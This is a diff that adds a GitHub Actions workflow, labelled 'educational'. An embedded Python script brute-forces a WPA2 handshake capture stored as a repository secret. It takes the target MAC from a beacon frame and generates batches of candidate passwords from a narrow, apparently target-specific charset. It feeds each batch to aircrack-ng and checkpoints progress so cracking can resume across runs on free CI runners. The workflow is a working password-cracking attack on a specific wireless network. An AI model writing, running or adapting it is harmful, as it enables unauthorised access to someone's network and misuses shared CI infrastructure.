@@ -1,0 +1,181 @@
+name: Educational Handshake Batch Test
+on:
+  workflow_dispatch:
+    inputs:
+      start:
+        description: Starting offset (ignored when resuming)
+        default: '0'
+        required: true
+      batches:
+        description: Million-candidate batches this run (1-5)
+        default: '1'
+        required: true
+      resume_run:
+        description: Previous run ID to resume (leave empty initially)
+        default: ''
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: educational-handshake-test
+  cancel-in-progress: false
+jobs:
+  test:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: Install Aircrack from Ubuntu packages
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq aircrack-ng
+      - name: Restore progress when requested
+        if: inputs.resume_run != ''
+        uses: actions/download-artifact@v4
+        with:
+          name: checkpoint
+          path: checkpoint
+          run-id: ${{ inputs.resume_run }}
+          github-token: ${{ github.token }}
+      - name: Generate and test sequential batches
+        env:
+          CAP_B64: ${{ secrets.HANDSHAKE_CAP_B64 }}
+          START: ${{ inputs.start }}
+          BATCHES: ${{ inputs.batches }}
+        run: |
+          python - <<'PY'
+          import base64
+          import hashlib
+          import itertools
+          import json
+          import os
+          from pathlib import Path
+          import subprocess
+          import tempfile
+          import time
+          
+          CHARSET = 'ODRACodkeni78421306'
+          MINIMUM, MAXIMUM, BATCH = 8, 11, 1_000_000
+          TOTAL = sum(len(CHARSET) ** n for n in range(MINIMUM, MAXIMUM + 1))
+          START = int(os.environ.get('START', '0'))
+          BATCHES = int(os.environ.get('BATCHES', '1'))
+          assert 0 <= START < TOTAL and 1 <= BATCHES <= 5, 'Invalid offset or batch count'
+          cap = base64.b64decode(os.environ.pop('CAP_B64'), validate=True)
+          fingerprint = hashlib.sha256(cap).hexdigest()
+          Path('checkpoint').mkdir(exist_ok=True)
+          statefile = Path('checkpoint/checkpoint.json')
+          if statefile.exists():
+              previous = json.loads(statefile.read_text())
+              assert previous['capture_sha256'] == fingerprint, 'Checkpoint capture differs'
+              assert previous['charset'] == CHARSET and previous['lengths'] == [MINIMUM, MAXIMUM], 'Checkpoint settings differ'
+              assert previous['status'] != 'found', 'Previous run already found a match'
+              START = int(previous['next_start'])
+              assert 0 <= START < TOTAL, 'Checkpoint exhausted or invalid'
+          state = dict(charset=CHARSET, lengths=[MINIMUM, MAXIMUM], capture_sha256=fingerprint,
+                       next_start=START, completed_this_run=0, status='ready', total=TOTAL)
+          
+          def save(status):
+              state['status'] = status
+              statefile.write_text(json.dumps(state, indent=2))
+              print(f"Status: {status}; completed this run: {state['completed_this_run']}; next start: {state['next_start']}", flush=True)
+          
+          def words(offset, count):
+              for length in range(MINIMUM, MAXIMUM + 1):
+                  space = len(CHARSET) ** length
+                  if offset >= space:
+                      offset -= space
+                      continue
+                  digits = [CHARSET[0]] * length
+                  number = offset
+                  for pos in range(length - 1, -1, -1):
+                      number, digit = divmod(number, len(CHARSET))
+                      digits[pos] = CHARSET[digit]
+                  # Start directly at offset; never enumerate earlier candidates.
+                  indices = [CHARSET.index(c) for c in digits]
+                  available = min(count, space - offset)
+                  for _ in range(available):
+                      yield ''.join(CHARSET[i] for i in indices)
+                      for pos in range(length - 1, -1, -1):
+                          indices[pos] += 1
+                          if indices[pos] < len(CHARSET):
+                              break
+                          indices[pos] = 0
+                  count -= available
+                  if count == 0:
+                      return
+                  offset = 0
+          
+          save('ready')
+          deadline = time.monotonic() + 18 * 60
+          try:
+              with tempfile.TemporaryDirectory() as temporary:
+                  root = Path(temporary)
+                  capture = root / 'capture.cap'
+                  capture.write_bytes(cap)
+                  cap = b''
+                  # Get target from the first management beacon in this reduced raw-802.11 PCAP.
+                  data = capture.read_bytes()
+                  import struct
+                  assert data[:4] == b'\xd4\xc3\xb2\xa1' and struct.unpack_from('<I', data, 20)[0] == 105, 'Unexpected capture format'
+                  packet_length = struct.unpack_from('<I', data, 32)[0]
+                  frame = data[40:40 + packet_length]
+                  assert (frame[0] & 0xfc) == 0x80, 'Missing initial beacon'
+                  target = ':'.join(f'{x:02x}' for x in frame[16:22])
+                  dictionary, keyfile, logfile = root / 'words.txt', root / 'key.txt', root / 'aircrack.log'
+                  for batch in range(BATCHES):
+                      offset = state['next_start']
+                      if offset == TOTAL:
+                          save('exhausted')
+                          break
+                      size = min(BATCH, TOTAL - offset)
+                      if time.monotonic() >= deadline:
+                          save('time_limit')
+                          break
+                      print(f'Preparing batch {batch + 1}/{BATCHES}: {size} candidates, offset {offset}', flush=True)
+                      with dictionary.open('w', encoding='ascii') as out:
+                          for word in words(offset, size):
+                              out.write(word + '\n')
+                      save('testing')
+                      keyfile.unlink(missing_ok=True)
+                      try:
+                          with logfile.open('wb') as log:
+                              process = subprocess.run(['aircrack-ng', '-a', '2', '-q', '-b', target,
+                                                        '-w', str(dictionary), '-l', str(keyfile), str(capture)],
+                                                       stdout=log, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
+                                                       timeout=max(1, deadline - time.monotonic()), check=False)
+                      except subprocess.TimeoutExpired:
+                          save('time_limit_incomplete_batch')
+                          break
+                      finally:
+                          dictionary.unlink(missing_ok=True)
+                      if keyfile.exists() and keyfile.stat().st_size:
+                          # Never print or upload the recovered password or raw aircrack output.
+                          keyfile.unlink()
+                          save('found')
+                          print('MATCH FOUND. Password intentionally omitted from public logs.', flush=True)
+                          break
+                      result = logfile.read_text(errors='replace').lower()
+                      logfile.unlink(missing_ok=True)
+                      if 'key not found' not in result and 'passphrase not in dictionary' not in result:
+                          save('capture_or_tool_error')
+                          raise RuntimeError('Aircrack did not confirm dictionary exhaustion; offset was not advanced. Check capture validity.')
+                      state['completed_this_run'] += size
+                      state['next_start'] = offset + size
+                      save('exhausted' if state['next_start'] == TOTAL else 'batch_complete')
+          finally:
+              # Only non-sensitive progress is written to public summaries and artifacts.
+              summary = os.environ.get('GITHUB_STEP_SUMMARY')
+              if summary:
+                  with open(summary, 'a') as out:
+                      out.write(f"## Educational offline test\n\nStatus: **{state['status']}**\n\nCompleted candidates this run: {state['completed_this_run']}\n\nNext start: `{state['next_start']}`\n\nLengths: 8–11; batch size: 1,000,000.\n\nA timed-out batch is repeated on resume to avoid skipping candidates.\n\nCapture and recovered key are never uploaded.\n")
+          PY
+      - name: Save progress only
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: checkpoint
+          path: checkpoint/checkpoint.json
+          if-no-files-found: warn
+          retention-days: 30
